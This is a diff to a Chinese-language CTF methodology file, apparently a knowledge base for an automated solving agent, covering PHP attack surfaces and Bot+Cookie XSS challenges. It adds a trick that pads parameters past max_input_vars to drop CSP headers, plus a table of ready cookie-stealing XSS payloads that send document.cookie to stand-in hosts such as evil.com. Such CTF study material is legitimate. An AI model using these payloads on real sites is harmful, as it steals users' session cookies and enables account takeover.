@@ -16,22 +16,32 @@
 3. 中间件/路由 → 请求处理链
 4. 配置文件 → 安全机制和隐藏功能
 5. 业务代码 → 具体漏洞点
-6. 框架源码 → 实现细节差异（关键！）
+6. 框架/运行时源码 → 实现细节差异（关键！）
 ```
+
+**按技术栈的关注重点**：
+
+| 技术栈 | 额外关注 |
+|--------|---------|
+| PHP | `php.ini` 配置（max_input_vars、display_errors、open_basedir）、`.htaccess`、输入过滤函数 |
+| Node.js/Next.js | `node_modules/` 框架源码、middleware 链、构建产物（`.next/`） |
+| Python/Django/Flask | `requirements.txt` 版本、DEBUG 模式、SECRET_KEY 泄露 |
 
 ### 1.2 源码审计优先级
 
 | 优先级 | 文件类型 | 原因 |
 |--------|---------|------|
-| 🔴 高 | nginx.conf / .htaccess / Caddyfile | 反向代理配置常含缓存规则，是缓存投毒的关键 |
+| 🔴 高 | nginx.conf / .htaccess / Caddyfile | 反向代理配置常含缓存规则/访问控制 |
+| 🔴 高 | Docker 配置（docker-compose.yml） | 容器间网络、端口映射、环境变量、内部域名 |
 | 🔴 高 | middleware（Express/Next.js/Koa） | 请求拦截器可能修改请求/响应，引入注入点 |
-| 🔴 高 | Docker 配置（docker-compose.yml） | 容器间网络、端口映射、环境变量 |
+| 🔴 高 | php.ini / .htaccess / 运行时配置 | PHP 配置直接影响安全行为（max_input_vars、display_errors） |
 | 🟡 中 | 路由处理函数 | 业务逻辑漏洞 |
 | 🟡 中 | 认证/授权代码 | 权限绕过 |
+| 🟡 中 | Bot/爬虫代码 | Bot 行为决定了 XSS 的触发条件和 Cookie 可达性 |
 | 🟢 低 | 前端代码 | 通常只影响用户体验，除非有 XSS |
-| 🔴 高 | 框架源码（node_modules/vendor） | **复杂题目的突破往往在这里** |
+| 🔴 高 | 框架/运行时源码（node_modules/vendor） | **复杂题目的突破往往在这里** |
 
-### 1.3 框架源码审计方法
+### 1.3 框架/运行时源码审计方法
 
 **什么时候需要读框架源码？**
 - 应用代码分析完毕但无法解释某个行为
@@ -40,15 +50,103 @@
 
 **怎么读框架源码？**
 1. 从应用代码中调用的框架 API 入手，追踪到框架内部
-2. 关注 `node_modules/<框架>/dist/` 中的编译后代码（通常是压缩的）
-3. 用 grep 搜索关键词（如 header 名称、配置项名称）
-4. 对比同一功能在不同文件中的实现（差异即漏洞候选）
+2. 用 grep 搜索关键词（如 header 名称、配置项名称）
+3. 对比同一功能在不同文件中的实现（差异即漏洞候选）
 
 **关注点**：
-- 请求头解析逻辑（`=== '1'` vs `!== undefined`）
+- 请求头解析逻辑（如 `=== '1'` vs `!== undefined`）
 - Vary 头设置逻辑（哪些头被加入 Vary）
 - 缓存控制逻辑（何时设置 Cache-Control）
 - 响应头修改逻辑（CT 覆盖、CSP 设置）
+
+### 1.4 PHP 应用分析方法
+
+PHP 应用有特有的安全配置和行为，需要额外关注。
+
+#### 1.4.1 关键 PHP 配置项
+
+| 配置项 | 默认值 | 安全影响 |
+|--------|--------|---------|
+| `max_input_vars` | 1000 | 超过限制触发 WARNING → 可能导致 headers already sent → 安全头（CSP/HSTS）消失 |
+| `display_errors` | 开发环境 On / 生产环境 Off | 错误输出到页面 → headers already sent / 信息泄露 |
+| `open_basedir` | 无限制 | 限制 PHP 可访问的目录路径 |
+| `upload_max_filesize` | 2M | 文件上传大小限制 |
+| `post_max_size` | 8M | POST 数据大小限制 |
+| `session.cookie_httponly` | Off | Cookie 是否可通过 JS 读取 |
+| `session.cookie_samesite` | 无 | Cookie 跨站发送限制 |
+
+#### 1.4.2 PHP 特有攻击面
+
+| 攻击面 | 检查方法 | 典型漏洞 |
+|--------|---------|---------|
+| max_input_vars | 发送 >1000 个参数，观察响应是否缺少安全头 | 安全头绕过（详见 `$AGENT_DIR/knowledge-base/csp-bypass.md`） |
+| display_errors | 触发 WARNING/NOTICE，观察是否输出到页面 | headers already sent → CSP 绕过 / 信息泄露 |
+| 反序列化 | 搜索 `unserialize()` 调用 | 对象注入 / RCE |
+| 文件包含 | 搜索 `include`/`require` 使用用户输入 | LFI/RFI |
+| 危险函数 | 搜索 `exec`/`system`/`eval`/`assert` | 命令注入 / 代码注入 |
+| 类型混淆 | PHP 弱类型比较（`==` vs `===`） | 认证绕过（如 `0 == "admin"` 为 true） |
+
+#### 1.4.3 PHP 参数计数
+
+PHP 的 `max_input_vars` 限制计算**所有来源**的输入变量：
+
+```
+总数 = GET 参数 + POST 参数 + Cookie 数
+```
+
+利用方法：在正常参数之后添加垃圾参数，使总数超过 1000。重要参数放在前面确保被正常解析。
+
+### 1.5 Bot + Cookie 类题目分析方法
+
+CTF 中 Bot + Cookie 是非常常见的模式：Bot 用浏览器访问页面，带着包含 flag 的 Cookie。目标是构造 XSS 在 Bot 的浏览器中执行，窃取 Cookie。
+
+#### 1.5.1 识别 Bot + Cookie 模式
+
+| 信号 | 含义 |
+|------|------|
+| 存在 `/bot/visit` 类端点 | 可以让 Bot 访问指定 URL |
+| Docker 配置中有 Bot 容器 | Bot 是独立的浏览器服务 |
+| Bot 使用 Puppeteer/Playwright | 真实浏览器，支持 JS 执行 |
+| Cookie 域设置为内部域名 | Cookie 只在内部网络域名下发送 |
+
+#### 1.5.2 Bot 类题目分析流程
+
+```
+1. 确定 Bot 行为
+   ├── Bot 访问什么 URL？（内部域名 vs 外部域名）
+   ├── Bot 的 Cookie 域是什么？（决定了 XSS 能否读到 flag）
+   ├── Bot 是否等待页面加载完成？（影响 XSS 执行时机）
+   └── Bot 的浏览器有什么限制？（User-Agent、超时时间）
+
+2. 确定攻击面
+   ├── 哪些页面 Bot 会访问？（需要找到存储型注入点）
+   ├── 注入的 payload 在什么上下文渲染？（HTML/JS/属性/Markdown）
+   └── 是否有 CSP/XSS 过滤阻止 payload 执行？
+
+3. 确定外泄方式
+   ├── 目标环境是否有外网？（Docker 隔离可能无外网）
+   ├── 有外网 → webhook.site / 攻击者服务器
+   ├── 无外网 → 缓存中缓存 / DNS exfiltration
+   └── Cookie 是否有 httpOnly？（httpOnly 则 document.cookie 读不到）
+```
+
+#### 1.5.3 Bot URL 关键注意事项
+
+**内部域名 vs 外部域名**：Docker 环境中 Bot 通常通过内部网络（如 `http://nginx`、`http://app`）访问，而不是外部地址。Cookie 的域也设置为内部域名。这意味着：
+
+- Bot URL **必须使用内部域名**，Cookie 才会被发送
+- 如果 Bot URL 用外部地址（如 `http://46.62.153.171:6767`），Cookie 不会被发送，`document.cookie` 为空
+- 查看 docker-compose.yml 中的服务名和网络配置来确定内部域名
+
+#### 1.5.4 常见 Cookie 外泄方式
+
+| 方式 | Payload | 受限条件 |
+|------|---------|---------|
+| `<img>` onerror | `<img src=x onerror="this.src='https://webhook/?c='+document.cookie">` | CSP `img-src` |
+| fetch/XMLHttpRequest | `fetch('https://webhook/?c='+document.cookie)` | CSP `connect-src` |
+| location 跳转 | `location.href='https://webhook/?c='+document.cookie` | CSP `navigate-to`（很少设置） |
+| WebSocket | `new WebSocket('wss://webhook/?c='+document.cookie)` | CSP `connect-src` |
+| DNS | `new Image().src='http://'+document.cookie.length+'.evil.com'` | 基本无限制（逐字符外泄） |
 
 ---
 
